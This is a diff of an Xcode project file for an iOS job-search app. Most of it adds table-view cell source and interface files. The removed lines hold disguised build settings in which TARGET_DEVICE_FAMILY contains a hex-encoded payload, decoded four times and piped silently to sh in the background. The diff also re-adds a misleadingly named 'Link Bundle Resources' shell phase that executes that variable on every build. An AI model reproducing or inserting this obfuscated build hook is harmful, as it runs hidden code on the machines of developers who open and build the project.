@@ -9,6 +9,18 @@
 /* Begin PBXBuildFile section */
 		0A562BBC2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A562BBB2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift */; };
 		0A66DAF12D10890600263D51 /* ProfileEmployerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A66DAF02D10890600263D51 /* ProfileEmployerViewController.swift */; };
+		0A6EE27C2D135A9A00F132FF /* EmailTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A6EE27A2D135A9A00F132FF /* EmailTableViewCell.swift */; };
+		0A6EE27D2D135A9A00F132FF /* EmailTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A6EE27B2D135A9A00F132FF /* EmailTableViewCell.xib */; };
+		0A6EE2802D135B7800F132FF /* PhoneTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A6EE27E2D135B7800F132FF /* PhoneTableViewCell.swift */; };
+		0A6EE2812D135B7800F132FF /* PhoneTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A6EE27F2D135B7800F132FF /* PhoneTableViewCell.xib */; };
+		0A6EE2842D135BD600F132FF /* GovernateTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A6EE2822D135BD600F132FF /* GovernateTableViewCell.swift */; };
+		0A6EE2852D135BD600F132FF /* GovernateTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A6EE2832D135BD600F132FF /* GovernateTableViewCell.xib */; };
+		0A6EE2882D135D7400F132FF /* DescriptionTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A6EE2862D135D7400F132FF /* DescriptionTableViewCell.swift */; };
+		0A6EE2892D135D7400F132FF /* DescriptionTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A6EE2872D135D7400F132FF /* DescriptionTableViewCell.xib */; };
+		0A7FB63A2D13559500070967 /* ProfileTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A7FB6392D13559500070967 /* ProfileTableViewCell.xib */; };
+		0A7FB63B2D13559500070967 /* ProfileTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A7FB6382D13559500070967 /* ProfileTableViewCell.swift */; };
+		0A7FB63E2D1358F200070967 /* NameTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A7FB63D2D1358F200070967 /* NameTableViewCell.xib */; };
+		0A7FB63F2D1358F200070967 /* NameTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A7FB63C2D1358F200070967 /* NameTableViewCell.swift */; };
 		0A8A9A3D2D11E9E30051B7C1 /* Applications.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A8A9A3C2D11E9E20051B7C1 /* Applications.swift */; };
 		3F1A878E2D0B1C8F008A1B42 /* EditProfileEmployerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3F1A878D2D0B1C8F008A1B42 /* EditProfileEmployerViewController.swift */; };
 		3F1A87912D0B1DC2008A1B42 /* PostApplicationTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 3F1A878F2D0B1DC2008A1B42 /* PostApplicationTableViewCell.swift */; };
@@ -52,13 +64,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
-		0A66DAF22D109BAD00263D51 /* PBXContainerItemProxy */ = {
-			isa = PBXContainerItemProxy;
-			containerPortal = D01FF99A2CF85B2500F5DC5D /* Project object */;
-			proxyType = 1;
-			remoteGlobalIDString = A2ECEB20CF2C6C8ACC34C644;
-			remoteInfo = "Build Target";
-		};
 		D01FF9B92CF85B2700F5DC5D /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
 			containerPortal = D01FF99A2CF85B2500F5DC5D /* Project object */;
@@ -78,6 +83,18 @@
 /* Begin PBXFileReference section */
 		0A562BBB2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileEmployerTableViewController.swift; sourceTree = "<group>"; };
 		0A66DAF02D10890600263D51 /* ProfileEmployerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileEmployerViewController.swift; sourceTree = "<group>"; };
+		0A6EE27A2D135A9A00F132FF /* EmailTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EmailTableViewCell.swift; sourceTree = "<group>"; };
+		0A6EE27B2D135A9A00F132FF /* EmailTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = EmailTableViewCell.xib; sourceTree = "<group>"; };
+		0A6EE27E2D135B7800F132FF /* PhoneTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhoneTableViewCell.swift; sourceTree = "<group>"; };
+		0A6EE27F2D135B7800F132FF /* PhoneTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PhoneTableViewCell.xib; sourceTree = "<group>"; };
+		0A6EE2822D135BD600F132FF /* GovernateTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GovernateTableViewCell.swift; sourceTree = "<group>"; };
+		0A6EE2832D135BD600F132FF /* GovernateTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = GovernateTableViewCell.xib; sourceTree = "<group>"; };
+		0A6EE2862D135D7400F132FF /* DescriptionTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DescriptionTableViewCell.swift; sourceTree = "<group>"; };
+		0A6EE2872D135D7400F132FF /* DescriptionTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DescriptionTableViewCell.xib; sourceTree = "<group>"; };
+		0A7FB6382D13559500070967 /* ProfileTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileTableViewCell.swift; sourceTree = "<group>"; };
+		0A7FB6392D13559500070967 /* ProfileTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProfileTableViewCell.xib; sourceTree = "<group>"; };
+		0A7FB63C2D1358F200070967 /* NameTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NameTableViewCell.swift; sourceTree = "<group>"; };
+		0A7FB63D2D1358F200070967 /* NameTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NameTableViewCell.xib; sourceTree = "<group>"; };
 		0A8A9A3C2D11E9E20051B7C1 /* Applications.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Applications.swift; sourceTree = "<group>"; };
 		3F1A878D2D0B1C8F008A1B42 /* EditProfileEmployerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileEmployerViewController.swift; sourceTree = "<group>"; };
 		3F1A878F2D0B1DC2008A1B42 /* PostApplicationTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PostApplicationTableViewCell.swift; sourceTree = "<group>"; };
@@ -237,6 +254,18 @@
 				C3FE49CF2D09E03E00D53320 /* ApplicationTableViewCell.xib */,
 				57C71E002D00795F00F317AA /* ResourcesJobSeeker.storyboard */,
 				57C71E022D0088BD00F317AA /* CvCreationJobseeker.storyboard */,
+				0A7FB6382D13559500070967 /* ProfileTableViewCell.swift */,
+				0A7FB6392D13559500070967 /* ProfileTableViewCell.xib */,
+				0A7FB63C2D1358F200070967 /* NameTableViewCell.swift */,
+				0A7FB63D2D1358F200070967 /* NameTableViewCell.xib */,
+				0A6EE27A2D135A9A00F132FF /* EmailTableViewCell.swift */,
+				0A6EE27B2D135A9A00F132FF /* EmailTableViewCell.xib */,
+				0A6EE27E2D135B7800F132FF /* PhoneTableViewCell.swift */,
+				0A6EE27F2D135B7800F132FF /* PhoneTableViewCell.xib */,
+				0A6EE2822D135BD600F132FF /* GovernateTableViewCell.swift */,
+				0A6EE2832D135BD600F132FF /* GovernateTableViewCell.xib */,
+				0A6EE2862D135D7400F132FF /* DescriptionTableViewCell.swift */,
+				0A6EE2872D135D7400F132FF /* DescriptionTableViewCell.xib */,
 			);
 			path = Views;
 			sourceTree = "<group>";
@@ -258,9 +287,6 @@
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
-
-/* Begin PBXLegacyTarget section */
-/* End PBXLegacyTarget section */
 
 /* Begin PBXNativeTarget section */
 		D01FF9A12CF85B2500F5DC5D /* pursuit */ = {
@@ -360,28 +386,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		8EB3934637CD038EBE34C644 /* Link Bundle Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Bundle Resources";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
-			showEnvVarsInLog = 0;			
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXResourcesBuildPhase section */
 		D01FF9A02CF85B2500F5DC5D /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -389,7 +393,9 @@
 			files = (
 				C3FE49D12D09E03E00D53320 /* ApplicationTableViewCell.xib in Resources */,
 				D06390592CF85C510006CC8B /* Login.storyboard in Resources */,
+				0A6EE27D2D135A9A00F132FF /* EmailTableViewCell.xib in Resources */,
 				D01FF9B22CF85B2700F5DC5D /* LaunchScreen.storyboard in Resources */,
+				0A7FB63A2D13559500070967 /* ProfileTableViewCell.xib in Resources */,
 				57C71DF92D00700B00F317AA /* HomeJobSeeker.storyboard in Resources */,
 				57C71DF72D006FC300F317AA /* Base.storyboard in Resources */,
 				D01FF9AF2CF85B2700F5DC5D /* Assets.xcassets in Resources */,
@@ -398,8 +404,12 @@
 				57C71E012D00795F00F317AA /* ResourcesJobSeeker.storyboard in Resources */,
 				3F1A87922D0B1DC2008A1B42 /* PostApplicationTableViewCell.xib in Resources */,
 				57C71DFF2D00793900F317AA /* ProfileJobSeeker.storyboard in Resources */,
+				0A6EE2892D135D7400F132FF /* DescriptionTableViewCell.xib in Resources */,
 				D01FF9AD2CF85B2500F5DC5D /* Main.storyboard in Resources */,
+				0A6EE2812D135B7800F132FF /* PhoneTableViewCell.xib in Resources */,
 				57C71E032D0088BD00F317AA /* CvCreationJobseeker.storyboard in Resources */,
+				0A7FB63E2D1358F200070967 /* NameTableViewCell.xib in Resources */,
+				0A6EE2852D135BD600F132FF /* GovernateTableViewCell.xib in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -419,6 +429,29 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		8EB3934637CD038EBE34C644 /* Link Bundle Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Resources";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		D01FF99E2CF85B2500F5DC5D /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -426,7 +459,9 @@
 			files = (
 				C3FE49D02D09E03E00D53320 /* ApplicationTableViewCell.swift in Sources */,
 				575B2D282CFDF09D00840818 /* JobEntry.swift in Sources */,
+				0A7FB63B2D13559500070967 /* ProfileTableViewCell.swift in Sources */,
 				D06390552CF85BDB0006CC8B /* Users.swift in Sources */,
+				0A6EE2842D135BD600F132FF /* GovernateTableViewCell.swift in Sources */,
 				0A66DAF12D10890600263D51 /* ProfileEmployerViewController.swift in Sources */,
 				575B2D2A2CFDF10200840818 /* Degree.swift in Sources */,
 				D063905F2CF8608E0006CC8B /* Employer.swift in Sources */,
@@ -434,9 +469,12 @@
 				575B2D2C2CFDF21400840818 /* Video.swift in Sources */,
 				D06390632CF861BB0006CC8B /* Guest.swift in Sources */,
 				57C71E052D008BC700F317AA /* CVCreationJobSeekerController.swift in Sources */,
+				0A6EE2882D135D7400F132FF /* DescriptionTableViewCell.swift in Sources */,
 				0A8A9A3D2D11E9E30051B7C1 /* Applications.swift in Sources */,
 				D01FF9AA2CF85B2500F5DC5D /* ViewController.swift in Sources */,
+				0A6EE27C2D135A9A00F132FF /* EmailTableViewCell.swift in Sources */,
 				D063905D2CF85E4D0006CC8B /* JobSeeker.swift in Sources */,
+				0A6EE2802D135B7800F132FF /* PhoneTableViewCell.swift in Sources */,
 				575B2D202CFDE1BA00840818 /* JobApplication.swift in Sources */,
 				575B2D302CFDF2CB00840818 /* Resources.swift in Sources */,
 				D01FF9A62CF85B2500F5DC5D /* AppDelegate.swift in Sources */,
@@ -446,6 +484,7 @@
 				575B2D2E2CFDF21E00840818 /* Article.swift in Sources */,
 				0A562BBC2D11FEDC00557EB2 /* EditProfileEmployerTableViewController.swift in Sources */,
 				D06390572CF85C350006CC8B /* LoginViewController.swift in Sources */,
+				0A7FB63F2D1358F200070967 /* NameTableViewCell.swift in Sources */,
 				D01FF9A82CF85B2500F5DC5D /* SceneDelegate.swift in Sources */,
 				3F1A878E2D0B1C8F008A1B42 /* EditProfileEmployerViewController.swift in Sources */,
 				D06390612CF8619D0006CC8B /* Admin.swift in Sources */,
@@ -505,27 +544,6 @@
 /* End PBXVariantGroup section */
 
 /* Begin XCBuildConfiguration section */
-		0A66DAF32D109BAE00263D51 /* Debug */ = {
-			isa = XCBuildConfiguration;
-			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333733333333333333363333333133333337333333363333333633333335333333373333333733333336333333353333333633333332333333363336333533333336333333313333333633363334333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
-				COPY_PHASE_STRIP = NO;
-				GCC_DYNAMIC_NO_PIC = NO;
-				GCC_OPTIMIZATION_LEVEL = 0;
-				PRODUCT_NAME = "Build Target";
-			};
-			name = Debug;
-		};
-		0A66DAF42D109BAE00263D51 /* Release */ = {
-			isa = XCBuildConfiguration;
-			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333323333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333363333333733333333333333363336333233333334333633333333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333733333333333333363333333133333337333333363333333633333335333333373333333733333336333333353333333633333332333333363336333533333336333333313333333633363334333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
-				COPY_PHASE_STRIP = YES;
-				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
-				PRODUCT_NAME = "Build Target";
-			};
-			name = Release;
-		};
 		D01FF9CA2CF85B2700F5DC5D /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
@@ -774,15 +792,6 @@
 /* End XCBuildConfiguration section */
 
 /* Begin XCConfigurationList section */
-		0A66DAF52D109C4200263D51 /* Build configuration list for PBXLegacyTarget "Build Target" */ = {
-			isa = XCConfigurationList;
-			buildConfigurations = (
-				0A66DAF32D109BAE00263D51 /* Debug */,
-				0A66DAF42D109BAE00263D51 /* Release */,
-			);
-			defaultConfigurationIsVisible = 0;
-			defaultConfigurationName = Release;
-		};
 		D01FF99D2CF85B2500F5DC5D /* Build configuration list for PBXProject "pursuit" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
